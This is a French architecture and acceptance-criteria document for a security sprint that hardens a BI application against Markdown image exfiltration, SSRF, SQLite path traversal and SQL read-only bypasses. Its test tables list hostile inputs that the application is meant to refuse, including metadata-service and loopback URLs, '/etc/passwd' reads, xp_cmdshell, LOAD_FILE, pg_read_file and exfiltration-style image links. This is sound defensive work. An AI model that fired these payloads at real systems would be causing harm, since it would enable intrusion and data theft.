# Architecture — Sprint `2026-11-10-securite-p0` (correctifs de sécurité P0)

- **Auteur** : Tech Lead · **Date** : 2026-11-10 · **Tâche orchestrateur** : #4
- **Type de sprint** : bug / sécurité (pas de `backlog.md` PO : les critères d'acceptation sont définis au § 1 ; UX/UI sautée, voir § 12)
- **Source** : `docs/audits/2026-11-10-audit-global.md` (§ 2.1, § 2.2, § 3), code au commit `b6dd547`
- **Périmètre** : C1, S2, S1, S3, S9 limité à la CSP `img-src`. **Hors périmètre** (suites, § 11) : C2, S4 (sauf options d'URI Mongo dangereuses liées à S1), C3, S5, S6, S7, S8, S10, dépendances, outillage de test.

> **Toutes les stories de ce sprint sont 🔒 Sensibles** : revue de sécurité renforcée du `reviewer` obligatoire.
> Plusieurs tâches touchent des fichiers soumis à **⚠️ VALIDATION HUMAINE REQUISE** (liste consolidée au § 10) : la GATE 2 doit les approuver explicitement.

---

## 0. Synthèse

| Story | Constat | Correctif retenu (résumé) | Tâches | 🔒 |
|---|---|---|---|---|
| US-1 | C1 — exfiltration par images Markdown | Composant partagé `SafeMarkdown` : aucune image chargée (marqueur à la place), liens limités à `https:` (+ `mailto:` et ancres), `rel`/`referrerPolicy` stricts | T-1, T-2 | 🔒 |
| US-5 | S9 partiel — CSP `img-src` | En-tête `Content-Security-Policy: img-src 'self' data: blob:` via `headers()` de `next.config.mjs` (aucune autre directive : pas d'impact sur le script inline, Google Fonts ni Google Identity Services) | T-3 | 🔒 |
| US-2 | S2 — lecture de fichiers SQLite arbitraires | `BI_SQLITE_DIR` obligatoire (sinon SQLite désactivé), résolution `realpath` + confinement, refus des liens symboliques, extension imposée | T-4, T-5 | 🔒 |
| US-3 | S1 — SSRF | Module `src/server/net/` : politique réseau (IP privées / réservées refusées, liste blanche `BI_ALLOWED_HOSTS`, mode `allowlist` optionnel), `safeFetch` avec **épinglage DNS** (anti-rebinding), sans redirection, taille plafonnée ; appliqué à REST/Airtable/Notion, Odoo, `baseUrl` LLM, hôtes SQL/Mongo | T-6 à T-12 | 🔒 |
| US-4 | S3 — lecture seule contournable | Analyseur lexical SQL par dialecte (chaînes, identifiants, commentaires), liste de mots-clés/fonctions étendue, préfixe `SELECT`/`WITH` seul, transaction lecture seule / annulée systématiquement pour les 4 SGBD, **limite de lignes côté SGBD**, délais d'exécution ; documentation « compte SGBD lecture seule obligatoire » | T-13 à T-16 | 🔒 |
| — | Documentation | `.env.example`, README (sécurité, connecteurs, migration) | T-17 | — |

**Aucune nouvelle dépendance** (choix délibéré, voir ADR-S1-01). Node ≥ 20 suffit (`net.BlockList`, `dns.promises`, `Readable.toWeb`) ; poste de dev : Node 24.14.

---

## 1. Critères d'acceptation (Gherkin) — référence QA

> Conventions : « un utilisateur authentifié » = session valide de rôle `user` (pas besoin d'être admin). Les appels HTTP sont faits sur `npm run dev` (voir § 9). Les messages cités sont **exacts** (cf. § 6) sauf mention « contient ».

### US-1 🔒 — Le rendu Markdown du LLM ne déclenche aucune requête réseau ni lien dangereux (C1)

```gherkin
Fonctionnalité: Neutralisation des images et liens dans le Markdown produit par le LLM

  Contexte:
    Étant donné un utilisateur authentifié sur l'application

  Scénario: Une image Markdown dans une réponse du chat n'est pas chargée
    Étant donné une réponse assistant contenant "![graphique](https://example.com/x.png?d=secret)"
    Quand la réponse est affichée dans le chat
    Alors aucune requête réseau vers "example.com" n'est émise (onglet Réseau des DevTools)
    Et aucun élément <img> n'est présent dans la bulle
    Et un marqueur textuel « Image non affichée (protection des données) : graphique » est affiché à la place

  Scénario: Une image Markdown dans le rapport exécutif n'est pas chargée, y compris à l'export PDF
    Étant donné un rapport exécutif dont le Markdown contient "![x](https://example.com/y.png)"
    Quand j'ouvre le rapport puis que je clique sur « Exporter en PDF »
    Alors aucune requête réseau vers "example.com" n'est émise
    Et le PDF affiche le marqueur « Image non affichée (protection des données) »

  Scénario: Une image en syntaxe de référence est aussi neutralisée
    Étant donné une réponse contenant "![a][r]" et la définition "[r]: https://example.com/z.png"
    Quand la réponse est affichée
    Alors aucune requête réseau vers "example.com" n'est émise

  Plan du scénario: Seuls les liens sûrs restent cliquables
    Étant donné une réponse contenant le lien "[voir](<url>)"
    Quand la réponse est affichée
    Alors le lien est rendu <rendu>

    Exemples:
      | url                                  | rendu                                                                 |
      | https://exemple.fr/doc               | cliquable, target="_blank", rel="noopener noreferrer nofollow", referrerpolicy="no-referrer" |
      | mailto:contact@exemple.fr            | cliquable                                                             |
      | #section                             | cliquable (ancre locale)                                              |
      | http://exemple.fr/doc                | en texte simple, non cliquable                                        |
      | javascript:alert(1)                  | en texte simple, non cliquable                                        |
      | data:text/html,<b>x</b>              | en texte simple, non cliquable                                        |
      | //example.com/x                      | en texte simple, non cliquable                                        |

  Scénario: Le domaine de destination d'un lien est visible avant le clic
    Étant donné une réponse contenant "[rapport](https://attaquant.tld/x?d=123)"
    Quand je survole le lien
    Alors l'info-bulle indique « Lien externe vers attaquant.tld »

  Scénario: Le HTML brut reste ignoré
    Étant donné une réponse contenant "<img src=https://example.com/a.png>"
    Quand la réponse est affichée
    Alors aucune requête vers "example.com" n'est émise et la balise n'est pas interprétée
```

### US-5 🔒 — CSP `img-src` (S9 partiel)

```gherkin
Fonctionnalité: Politique de sécurité du contenu limitant les sources d'images

  Scénario: L'en-tête CSP est présent sur les pages
    Quand j'appelle "GET /" (curl -I)
    Alors la réponse contient l'en-tête "Content-Security-Policy" avec la valeur exacte "img-src 'self' data: blob:"

  Scénario: Une image distante injectée hors Markdown est bloquée par le navigateur
    Étant donné l'application ouverte dans le navigateur
    Quand j'exécute dans la console "const i = new Image(); i.src = 'https://example.com/p.png'"
    Alors la console signale une violation de la directive "img-src"
    Et aucune requête vers "example.com" n'aboutit

  Scénario: Aucune régression fonctionnelle liée à la CSP
    Quand je parcours l'onboarding, le chat (Demo Advisor), le canevas, l'export PNG d'un widget, l'export PDF du rapport, l'import d'un PDF et le thème clair/sombre
    Alors aucune violation CSP n'apparaît dans la console
    Et la police Plus Jakarta Sans est chargée
    Et le choix de palette est appliqué dès le chargement (script inline de layout.tsx toujours exécuté)
    Et la connexion Google (Google Identity Services) ouvre toujours sa fenêtre d'autorisation
```

### US-2 🔒 — SQLite confiné à un dossier configuré (S2)

```gherkin
Fonctionnalité: Restriction des bases SQLite au dossier BI_SQLITE_DIR

  Contexte:
    Étant donné un utilisateur authentifié

  Scénario: SQLite désactivé si le dossier n'est pas configuré
    Étant donné que la variable BI_SQLITE_DIR n'est pas définie
    Quand j'appelle POST /api/connectors/test avec {"kind":"sqlite","config":{"path":"demo.sqlite"}}
    Alors la réponse a "ok": false
    Et "error" vaut « SQLite est désactivé sur ce serveur : l'administrateur doit définir BI_SQLITE_DIR. »

  Scénario: Fichier autorisé dans le dossier
    Étant donné BI_SQLITE_DIR pointant vers un dossier contenant "ventes.sqlite"
    Quand je teste puis j'inspecte le schéma de {"path":"ventes.sqlite"}
    Alors la réponse a "ok": true et le message commence par "SQLite "

  Scénario: Chemin absolu à l'intérieur du dossier accepté
    Quand je teste {"path":"<BI_SQLITE_DIR>/ventes.sqlite"}
    Alors la réponse a "ok": true

  Plan du scénario: Chemins refusés
    Quand je teste {"path":"<chemin>"}
    Alors la réponse a "ok": false
    Et "error" vaut « <message> »
    Et le message ne contient ni le chemin absolu de BI_SQLITE_DIR ni le chemin demandé

    Exemples:
      | chemin                               | message                                                                                             |
      | ../data/users.json                   | Chemin SQLite refusé : indiquez un fichier .sqlite, .sqlite3 ou .db situé dans le dossier autorisé. |
      | ../../autre-app/app.db               | Chemin SQLite refusé : indiquez un fichier .sqlite, .sqlite3 ou .db situé dans le dossier autorisé. |
      | /etc/passwd                          | Chemin SQLite refusé : indiquez un fichier .sqlite, .sqlite3 ou .db situé dans le dossier autorisé. |
      | C:\Windows\win.ini                   | Chemin SQLite refusé : indiquez un fichier .sqlite, .sqlite3 ou .db situé dans le dossier autorisé. |
      | :memory:                             | Chemin SQLite refusé : indiquez un fichier .sqlite, .sqlite3 ou .db situé dans le dossier autorisé. |
      | (chaîne vide)                        | Chemin SQLite refusé : indiquez un fichier .sqlite, .sqlite3 ou .db situé dans le dossier autorisé. |
      | file:ventes.sqlite?mode=rw           | Chemin SQLite refusé : indiquez un fichier .sqlite, .sqlite3 ou .db situé dans le dossier autorisé. |
      | lien-vers-dehors.sqlite (symlink)    | Chemin SQLite refusé : indiquez un fichier .sqlite, .sqlite3 ou .db situé dans le dossier autorisé. |
      | sous-dossier-symlink/x.sqlite (dossier lié hors racine) | Chemin SQLite refusé : indiquez un fichier .sqlite, .sqlite3 ou .db situé dans le dossier autorisé. |
      | absent.sqlite                        | Fichier SQLite introuvable dans le dossier autorisé.                                               |

  Scénario: La base reste ouverte en lecture seule
    Étant donné "ventes.sqlite" autorisé
    Quand j'exécute via POST /api/connectors/query la requête "SELECT * FROM t"
    Alors les lignes sont renvoyées
    Et le fichier "ventes.sqlite" n'est pas modifié (horodatage et empreinte SHA-256 identiques)
```

### US-3 🔒 — Aucune requête serveur vers une destination interne non autorisée (S1)

```gherkin
Fonctionnalité: Garde anti-SSRF commune à tous les appels sortants pilotés par l'utilisateur

  Contexte:
    Étant donné un utilisateur authentifié
    Et BI_ALLOWED_HOSTS et BI_NETWORK_POLICY non définis (politique par défaut « public »)

  Plan du scénario: Les destinations internes sont refusées pour l'API REST
    Quand j'appelle POST /api/connectors/fetch avec {"kind":"rest","config":{"url":"<url>"}}
    Alors la réponse a "ok": false
    Et "error" vaut « Destination refusée par la politique réseau du serveur (adresse interne ou non autorisée). Si cette source est légitime, demandez à l'administrateur de l'ajouter à BI_ALLOWED_HOSTS. »
    Et aucune connexion TCP n'est ouverte vers la cible (vérifiable : serveur témoin local sans aucune requête reçue)

    Exemples:
      | url                                              |
      | http://169.254.169.254/latest/meta-data/          |
      | http://localhost:3000/api/admin/users             |
      | http://127.0.0.1:3000/                            |
      | http://2130706433/                                |
      | http://0x7f000001/                                |
      | http://0177.0.0.1/                                |
      | http://[::1]:3000/                                |
      | http://[::ffff:127.0.0.1]:3000/                   |
      | http://10.0.0.1/                                  |
      | http://192.168.1.1/                               |
      | http://172.16.0.1/                                |
      | http://100.64.0.1/                                |
      | http://0.0.0.0:3000/                              |
      | http://[fd00::1]/                                 |

  Scénario: Un nom d'hôte résolvant vers une IP interne est refusé (contrôle après résolution DNS)
    Étant donné un nom d'hôte dont la résolution renvoie 127.0.0.1 (ex. "localhost")
    Quand je l'utilise comme URL REST, URL Odoo, URL de base LLM ou hôte SQL
    Alors la destination est refusée avec le message de politique réseau

  Scénario: Anti DNS-rebinding — la connexion utilise l'adresse vérifiée
    Étant donné un résolveur qui renvoie d'abord une IP publique puis 127.0.0.1
    Quand safeFetch établit la connexion
    Alors l'adresse effectivement connectée est celle qui a été contrôlée (test unitaire du lookup épinglé, § 9.2)

  Scénario: Les redirections ne sont pas suivies
    Étant donné une URL publique répondant 302 vers http://127.0.0.1/
    Quand je synchronise ce connecteur REST
    Alors "error" vaut « Redirection refusée : indiquez directement l'URL finale (les redirections ne sont pas suivies). »

  Scénario: Les identifiants dans l'URL sont refusés
    Quand je synchronise {"kind":"rest","config":{"url":"https://user:pass@api.exemple.com/x"}}
    Alors "error" vaut « Adresse invalide : seules les URL http(s) sans identifiants intégrés sont acceptées. »

  Scénario: Le corps des erreurs distantes n'est pas renvoyé au client
    Étant donné une API publique répondant 500 avec un corps "SECRET-INTERNE"
    Quand je la synchronise
    Alors "error" vaut « API REST HTTP 500. » et ne contient pas "SECRET-INTERNE"

  Scénario: L'en-tête Host ne peut pas être forcé
    Quand je synchronise une API REST avec "headers": "{\"Host\":\"localhost\"}"
    Alors "error" vaut « En-tête non autorisé : Host. »

  Scénario: La liste blanche autorise une destination interne explicitement approuvée
    Étant donné BI_ALLOWED_HOSTS="localhost:8000,10.0.0.0/8"
    Quand je teste un NIM auto-hébergé avec baseUrl "http://localhost:8000/v1"
    Alors l'appel est émis vers localhost:8000
    Et un appel vers "http://localhost:3000/" reste refusé (port différent)

  Scénario: Les adresses de métadonnées cloud restent refusées même en liste blanche
    Étant donné BI_ALLOWED_HOSTS="169.254.0.0/16"
    Quand je synchronise "http://169.254.169.254/latest/meta-data/"
    Alors la destination est refusée avec le message de politique réseau

  Scénario: Mode liste blanche stricte
    Étant donné BI_NETWORK_POLICY="allowlist" et BI_ALLOWED_HOSTS="api.exemple.com"
    Quand je synchronise "https://api.autre.com/x"
    Alors la destination est refusée avec le message de politique réseau

  Scénario: baseUrl LLM limitée aux fournisseurs compatibles OpenAI
    Quand j'appelle POST /api/llm/test avec {"provider":"anthropic","apiKey":"x","baseUrl":"https://proxy.exemple.com"}
    Alors la réponse a "ok": false et "message" vaut « URL de base non prise en charge pour ce fournisseur. »

  Scénario: baseUrl LLM en http:// refusée hors liste blanche
    Quand j'appelle POST /api/llm/test avec {"provider":"openai","apiKey":"x","baseUrl":"http://proxy.exemple.com/v1"}
    Alors "message" vaut « URL de base en http:// refusée : utilisez https:// ou faites autoriser l'hôte par l'administrateur. »

  Scénario: Les fournisseurs officiels fonctionnent sans configuration
    Étant donné une clé API valide (test manuel, après accord humain : appel réseau tiers réel)
    Quand je valide la clé Anthropic / OpenAI / Gemini / DeepSeek / NVIDIA cloud sans baseUrl
    Alors la liste des modèles est chargée comme avant

  Plan du scénario: Hôtes de bases de données internes refusés
    Quand j'appelle POST /api/connectors/test avec {"kind":"<kind>","config":{"host":"127.0.0.1","port":"<port>","user":"u","password":"p","database":"d"}}
    Alors "error" vaut le message de politique réseau

    Exemples:
      | kind     | port |
      | postgres | 5432 |
      | mysql    | 3306 |
      | mssql    | 1433 |

  Scénario: Chaîne de connexion SQL refusée
    Quand je teste {"kind":"postgres","config":{"url":"postgres://u:p@127.0.0.1/d"}}
    Alors "error" vaut « Chaîne de connexion non prise en charge : renseignez l'hôte, le port et les identifiants. »

  Scénario: Hôte SQL de type socket Unix refusé
    Quand je teste {"kind":"postgres","config":{"host":"/var/run/postgresql","port":"5432"}}
    Alors "error" vaut « Hôte invalide. »

  Plan du scénario: URI MongoDB interne ou dangereuse refusée
    Quand je teste {"kind":"mongodb","config":{"url":"<uri>"}}
    Alors "error" vaut « <message> »

    Exemples:
      | uri                                                                  | message                                                       |
      | mongodb://127.0.0.1:27017/db                                          | (message de politique réseau)                                 |
      | mongodb://public.exemple.com,10.0.0.5:27017/db                        | (message de politique réseau)                                 |
      | mongodb://h.exemple.com/db?proxyHost=127.0.0.1                        | Option de connexion MongoDB non autorisée (proxyHost).        |
      | mongodb://h.exemple.com/db?authMechanism=MONGODB-AWS                  | Option de connexion MongoDB non autorisée (authMechanism).    |
      | mongodb://h.exemple.com/db?tlsCAFile=/etc/passwd                      | Option de connexion MongoDB non autorisée (tlsCAFile).        |
      | mongodb://%2Ftmp%2Fmongodb-27017.sock/db                              | Hôte invalide.                                                |
```

### US-4 🔒 — Lecture seule effective et bornée sur les 4 SGBD (S3)

```gherkin
Fonctionnalité: Garde-fou lecture seule renforcé pour les connecteurs SQL

  Plan du scénario: Requêtes refusées avant exécution (tous dialectes concernés)
    Quand j'exécute via POST /api/connectors/query la requête "<sql>" sur une source "<kind>"
    Alors la réponse a "ok": false
    Et "error" contient « <extrait> »
    Et aucune requête n'est envoyée au SGBD

    Exemples:
      | kind     | sql                                                          | extrait                                   |
      | mssql    | SELECT * INTO copie FROM clients                             | Mot-clé ou fonction interdit (INTO)       |
      | mssql    | SELECT * FROM OPENROWSET('SQLNCLI','...','SELECT 1')         | Mot-clé ou fonction interdit (OPENROWSET) |
      | mssql    | SELECT * FROM OPENQUERY(lnk,'SELECT 1')                      | Mot-clé ou fonction interdit (OPENQUERY)  |
      | mssql    | SELECT 1; EXEC xp_cmdshell 'dir'                             | Une seule instruction SQL est autorisée.  |
      | mysql    | SELECT * FROM t INTO DUMPFILE '/tmp/x'                       | Mot-clé ou fonction interdit (INTO)       |
      | mysql    | SELECT LOAD_FILE('/etc/passwd')                              | Mot-clé ou fonction interdit (LOAD_FILE)  |
      | mysql    | SELECT 'a\'; DELETE FROM t; -- '                             | barre oblique inverse                     |
      | mysql    | SELECT 1 /*! , SLEEP(10) */                                  | Commentaires /* */ non autorisés          |
      | mysql    | SELECT * FROM t FOR UPDATE                                   | Mot-clé ou fonction interdit (FOR UPDATE) |
      | postgres | SELECT pg_read_file('/etc/passwd')                           | Mot-clé ou fonction interdit (PG_READ_FILE) |
      | postgres | SELECT pg_terminate_backend(123)                             | Mot-clé ou fonction interdit (PG_TERMINATE_BACKEND) |
      | postgres | SELECT * FROM dblink('host=x','select 1') AS t(a int)        | Mot-clé ou fonction interdit (DBLINK)     |
      | postgres | SELECT 1; DELETE FROM t                                      | Une seule instruction SQL est autorisée.  |
      | postgres | SHOW ALL                                                     | Seules les requêtes en lecture (SELECT) sont autorisées. |
      | sqlite   | SELECT load_extension('x')                                   | Mot-clé ou fonction interdit (LOAD_EXTENSION) |
      | postgres | SELECT 'abc                                                  | Requête SQL mal formée                    |

  Plan du scénario: Faux positifs évités (littéraux, identifiants cités, commentaires de ligne)
    Quand j'exécute "<sql>" sur "<kind>"
    Alors la requête est acceptée par le garde-fou

    Exemples:
      | kind     | sql                                                                 |
      | postgres | SELECT 'delete; drop' AS libelle                                     |
      | postgres | SELECT "into" FROM t                                                 |
      | mysql    | SELECT `update` FROM t                                               |
      | mssql    | SELECT [call] FROM t                                                 |
      | mssql    | SELECT * FROM #temp_ventes                                           |
      | postgres | SELECT $$a;b$$ AS x                                                  |
      | postgres | -- total par mois\nSELECT date_trunc('month', d), sum(m) FROM v GROUP BY 1 |
      | mysql    | SELECT deleted_at, updated_by FROM t                                 |
      | postgres | SELECT 1;                                                            |

  Scénario: Le volume lu est borné côté SGBD
    Étant donné une table de 2 000 000 de lignes
    Quand j'exécute "SELECT * FROM grosse_table" (et la variante "SELECT * FROM grosse_table LIMIT 500000")
    Alors la réponse contient exactement 1000 lignes
    Et la mémoire du processus Node n'augmente pas de façon proportionnelle à la table (≤ ~50 Mo d'écart)
    Et la réponse arrive en moins de 10 s

  Scénario: Les requêtes trop longues sont interrompues
    Étant donné une requête dont l'exécution dépasse 30 s côté SGBD (PostgreSQL, MySQL, SQL Server)
    Quand je l'exécute
    Alors "error" vaut « Requête trop longue : délai de 30 s dépassé. Ajoutez des filtres ou une agrégation. »

  Scénario: Toute écriture qui passerait le filtre est annulée par le SGBD (MySQL, SQL Server)
    Étant donné une fonction ou un mot-clé d'écriture non listé exécuté dans la requête
    Quand la requête s'exécute
    Alors la transaction est en lecture seule (MySQL) ou systématiquement annulée par ROLLBACK (SQL Server, PostgreSQL)
    Et aucune donnée n'est modifiée en base

  Scénario: Le pilote MySQL refuse LOCAL INFILE
    Étant donné un serveur MySQL malveillant demandant la lecture d'un fichier client
    Alors aucun fichier du serveur BI Advisor n'est transmis

  Scénario: La documentation exige un compte en lecture seule
    Quand je lis le README (§ Sécurité et § Connecteurs) et le formulaire de connexion SQL
    Alors il est indiqué qu'un compte SGBD en lecture seule est obligatoire et constitue la seule garantie réelle
    Et le README fournit un exemple de création de rôle lecture seule pour PostgreSQL, MySQL et SQL Server
```

---

## 2. Vue d'ensemble technique

### 2.1 Nouveaux modules

| Fichier (nouveau) | Rôle | Dépendances |
|---|---|---|
| `src/lib/markdown-safety.ts` | Fonctions pures `safeUrlTransform`, `linkHost` (testables sans React) | aucune |
| `src/components/ui/SafeMarkdown.tsx` | Rendu Markdown durci partagé (chat + rapport) | `react-markdown`, `remark-gfm`, `lucide-react` (existants) |
| `src/server/net/policy.ts` | Politique réseau : lecture des variables d'env, classification IP, liste blanche, résolution + vérification, `guardedLookup`, validation d'hôte, analyse d'URI Mongo | `node:net`, `node:dns` uniquement |
| `src/server/net/safe-fetch.ts` | Client HTTP(S) sûr renvoyant un `Response` standard | `node:http`, `node:https`, `node:zlib`, `node:stream`, `./policy` |
| `src/server/connectors/sqlite-path.ts` | `resolveSqlitePath(input)` (confinement `BI_SQLITE_DIR`) | `node:fs`, `node:path` |
| `src/server/connectors/sql-guard.ts` | Analyseur lexical SQL par dialecte + `assertReadOnly(sql, dialect)` + constantes | aucune |

**Contrainte de testabilité** : `markdown-safety.ts`, `policy.ts`, `sqlite-path.ts` et `sql-guard.ts` ne doivent importer **que** des modules `node:*` (pas d'alias `@/`, pas d'import relatif sauf `safe-fetch → ./policy`), et n'utiliser que de la syntaxe TypeScript « effaçable » (pas d'`enum`, pas de `namespace`, pas de propriétés de paramètres de constructeur `constructor(public x)`). Ils pourront ainsi être exécutés directement par `node` 24 (strip-types natif) depuis des scripts de vérification `.mjs` (§ 9), sans installer `tsx`.

### 2.2 Fichiers modifiés

`src/components/chat/MessageBubble.tsx`, `src/components/report/ReportModal.tsx`, `next.config.mjs` ⚠️, `src/server/connectors/sql.ts` ⚠️, `src/server/connectors/saas.ts` ⚠️, `src/server/connectors/odoo.ts` ⚠️, `src/server/connectors/mongo.ts` ⚠️, `src/server/connectors/index.ts` ⚠️, `src/server/llm.ts`, `src/app/api/llm/chat/route.ts`, `src/app/api/llm/test/route.ts`, `src/components/connectors/ConnectorsModal.tsx`, `.env.example` ⚠️, `README.md`.
Aucune modification de `src/lib/types.ts`, `store.ts`, `actions.ts`, `vault.ts`, `src/server/auth/**`, `package.json`, `tsconfig.json`.

---

## 3. ADR (décisions du sprint)

### ADR-S1-01 — Garde anti-SSRF sans dépendance, par épinglage DNS via l'option `lookup` de `node:http(s)`
- **Contexte** : il faut contrôler l'IP **effectivement connectée** (DNS rebinding : un contrôle « résoudre puis `fetch(url)` » laisse `fetch` re-résoudre). Le `fetch` global de Node (undici embarqué) n'accepte un résolveur personnalisé que via un `dispatcher` undici, non exposé sans installer le paquet `undici`.
- **Décision** : `safeFetch` implémenté sur `node:http`/`node:https` avec une fonction `lookup` qui résout, vérifie **toutes** les adresses et ne rend que des adresses autorisées ; la socket se connecte donc à l'IP vérifiée, tandis que `Host` et SNI/certificat TLS restent ceux du nom d'hôte. Pour les IP littérales (Node n'appelle pas `lookup`), contrôle direct avant la requête. Renvoie un `Response` standard (`Readable.toWeb`) pour limiter l'impact sur les appelants (`sseLines`, `res.json()`).
- **Alternatives** : (a) paquet `undici` + `Agent({ connect: { lookup } })` — plus concis mais nouvelle dépendance à aligner sur la version embarquée par Node/Next, ⚠️ validation humaine ; (b) contrôle avant `fetch` global — vulnérable au rebinding ; (c) proxy sortant filtrant (infrastructure) — hors du périmètre applicatif, recommandé en complément pour la production.
- **Conséquences** : ~150 lignes à écrire et tester (décompression gzip/deflate/br, plafond de taille, délai, pas de redirection) ; aucun impact bundle client (code serveur uniquement).

### ADR-S1-02 — Politique réseau par défaut « public », liste blanche administrée par variables d'environnement
- **Décision** : `BI_NETWORK_POLICY=public` (défaut) : toute destination publique autorisée ; adresses privées / loopback / réservées refusées sauf entrée de `BI_ALLOWED_HOSTS`. `BI_NETWORK_POLICY=allowlist` : seules les entrées de `BI_ALLOWED_HOSTS` sont autorisées. Les plages **toujours interdites** (link-local `169.254.0.0/16`, `fe80::/10` — métadonnées cloud —, `0.0.0.0/8`, `::`, multicast, broadcast) ne sont jamais débloquables.
- **Alternatives** : (a) autoriser les IP privées pour les seules bases SQL (usage intranet courant) — rejeté : c'est précisément le balayage interne décrit en S1 ; (b) réserver les connecteurs au rôle admin — utile mais ne protège pas d'un admin compromis ni de l'injection de prompt ; proposé en suite (§ 11).
- **Conséquences** : **changement cassant** pour les installations qui interrogent une base / un NIM / une API sur le réseau interne ou `localhost` : l'administrateur doit renseigner `BI_ALLOWED_HOSTS`. Note de migration dans le README (T-17). ⚠️ VALIDATION HUMAINE REQUISE.

### ADR-S2-01 — SQLite désactivé tant que `BI_SQLITE_DIR` n'est pas défini
- **Décision** : pas de dossier par défaut implicite (un défaut comme `./data/sqlite` exposerait le voisinage de `data/`). Sans variable, tout connecteur SQLite échoue avec un message explicite. Les chemins relatifs sont résolus par rapport à `BI_SQLITE_DIR` ; les chemins absolus sont acceptés **seulement** s'ils sont dans le dossier (compatibilité avec les configurations existantes).
- **Conséquences** : changement cassant pour les utilisateurs SQLite actuels (à documenter). Interdiction de faire pointer `BI_SQLITE_DIR` sur `BI_DATA_DIR` ou un parent (contrôle au démarrage de la résolution, voir T-4).

### ADR-S3-01 — Lecture seule en profondeur : analyse lexicale + mécanisme SGBD + limite côté SGBD
- **Décision** : (1) analyseur lexical dépendant du dialecte qui neutralise littéraux, identifiants cités et commentaires de ligne avant tout contrôle ; refus des commentaires `/* */` (supprime les ambiguïtés d'imbrication PostgreSQL et les commentaires exécutables MySQL `/*! */`) ; refus des chaînes contenant `\` en MySQL (ambiguïté `NO_BACKSLASH_ESCAPES`) ; (2) préfixe `SELECT`/`WITH` uniquement pour les requêtes utilisateur/LLM ; (3) liste étendue de mots-clés/fonctions ; (4) par SGBD : PG `BEGIN READ ONLY` + curseur (`DECLARE … CURSOR FOR` n'accepte qu'un `SELECT`/`VALUES`) + `FETCH 1001` ; MySQL `START TRANSACTION READ ONLY` + `sql_select_limit` + lecture en flux interrompue ; MSSQL transaction systématiquement annulée + `SET ROWCOUNT 1001` ; SQLite `stmt.readonly` + `iterate()` interrompu ; (5) délais d'exécution partout.
- **Alternatives** : envelopper la requête (`SELECT * FROM (<q>) t LIMIT 1001`) — rejeté : casse les CTE en MSSQL, les `ORDER BY` en sous-requête MSSQL, les colonnes homonymes en MySQL (erreur 1060).
- **Conséquences** : `SHOW`/`DESCRIBE`/`EXPLAIN`/`PRAGMA` ne sont plus acceptés via `/api/connectors/query` (le prompt n'autorise déjà que `SELECT`) ; les requêtes contenant `/* */` sont refusées (le LLM pourra corriger via « Corriger avec l'IA »). **La seule garantie réelle reste un compte SGBD en lecture seule** (documenté).
- **Amendement (arbitrage après boucle 3, CR-16, sous réserve de validation humaine)** : (6) avant toute analyse lexicale, refus de la requête entière, littéraux compris, si elle contient un caractère de contrôle autre que `\t`, `\n` ou `\r\n`, ou bien `U+2028`/`U+2029` (message E-SQL-9). On supprime ainsi les caractères sur lesquels les analyseurs des SGBD divergent (`\r` isolé termine `--` en PostgreSQL), plutôt que de reproduire chaque analyseur. La normalisation des fins de ligne a été écartée, car elle modifie les littéraux et ne couvre pas NUL. Détail : `code-review.md` § « Arbitrage après boucle 3 ».

### ADR-C1-01 — Composant `SafeMarkdown` unique ; aucune image distante, même en `https:`
- **Décision** : composant partagé ; les images sont remplacées par un marqueur textuel (aucune exception, y compris `data:` — inutile pour des réponses LLM et vecteur de contenu trompeur) ; `urlTransform` restrictif ; pas de `rehype-raw` (le HTML brut reste ignoré, comportement par défaut de `react-markdown` 9).
- **Alternative** : liste blanche de domaines d'images — rejetée (aucun besoin produit, surface d'exfiltration).

### ADR-S9-01 — CSP réduite à `img-src` via `headers()` de `next.config.mjs`
- **Décision** : en-tête `Content-Security-Policy: img-src 'self' data: blob:` sur toutes les routes. Une CSP ne contenant que `img-src` ne restreint ni les scripts (script inline de `layout.tsx`, `accounts.google.com/gsi/client`), ni les styles/polices (Google Fonts), ni `connect-src` (appels Google APIs, fetch des polices par `html-to-image`) ⇒ **pas de nonce/hash nécessaire**. `data:` est requis par `html-to-image` (SVG `data:` pour PNG/PDF) et `jsPDF` ; `blob:` par `pdfjs-dist` et les téléchargements.
- **Alternative** : `middleware.ts` avec nonce et CSP complète — reportée à la suite S9 (§ 11).

---

## 4. Conception détaillée et tâches par story

### US-1 🔒 — C1 : Markdown LLM sûr (sous-étape 2.1)

**T-1 — Créer `src/lib/markdown-safety.ts` et `src/components/ui/SafeMarkdown.tsx`**

`markdown-safety.ts` (pur) :
```ts
/** Transforme une URL de lien Markdown : renvoie l'URL si sûre, '' sinon. Les `src` (images) sont toujours vidés. */
export function safeUrlTransform(url: string, key: string): string;
/** Hôte affiché dans l'info-bulle ; '' si non analysable. */
export function linkHost(href: string): string;
```
Règles de `safeUrlTransform` :
- `key === 'src'` (ou toute clé ≠ `href`) → `''`.
- Ancre locale `#…` → conservée. `mailto:` → conservée.
- `https:` → conservée **après** `new URL(url)` réussi (normalisation) ; sinon `''`.
- Tout le reste (`http:`, `javascript:`, `data:`, `vbscript:`, `file:`, URL relatives, protocole relatif `//`) → `''`.
- Ne pas s'appuyer sur un simple `startsWith` sans `trim()` + insensibilité à la casse (`JaVaScRiPt:`, espaces/contrôles en tête).

`SafeMarkdown.tsx` :
```tsx
export default function SafeMarkdown(props: { text: string; className?: string; variant?: 'chat' | 'report' }): JSX.Element;
```
- `<ReactMarkdown remarkPlugins={[remarkGfm]} urlTransform={safeUrlTransform} skipHtml components={…}>`.
- `components.img` → **jamais** de `<img>` : `<span className="inline-flex items-center gap-1 rounded-md border border-line px-1.5 text-[12px] text-muted"><ImageOff size={12} aria-hidden />Image non affichée (protection des données){alt ? ` : ${alt}` : ''}</span>` (alt tronqué à 80 caractères).
- `components.a` : si `href` vide (URL refusée) → `<span>{children}</span>` (texte simple) ; sinon `<a href target="_blank" rel="noopener noreferrer nofollow" referrerPolicy="no-referrer" title={`Lien externe vers ${linkHost(href)}`}>` ; ancres `#` sans `target`.
- Reprendre les surcharges existantes du chat (`pre`, `table`) pour `variant="chat"` ; le rapport garde le style actuel (`variant="report"`, pas de surcharge `pre`).
- Ne **pas** propager aveuglément les props (`{...p}`) sur `<a>` (le code actuel le fait) : n'en reprendre que `href` et `children`.

**T-2 — Brancher `SafeMarkdown`**
- `MessageBubble.tsx` : supprimer la fonction `Md` locale et les imports `ReactMarkdown`/`remarkGfm` ; utiliser `<SafeMarkdown text={s.text} variant="chat" className="md text-[13.5px]" />`.
- `ReportModal.tsx` : remplacer `<ReactMarkdown remarkPlugins={[remarkGfm]}>{md}</ReactMarkdown>` par `<SafeMarkdown text={md} variant="report" />`.
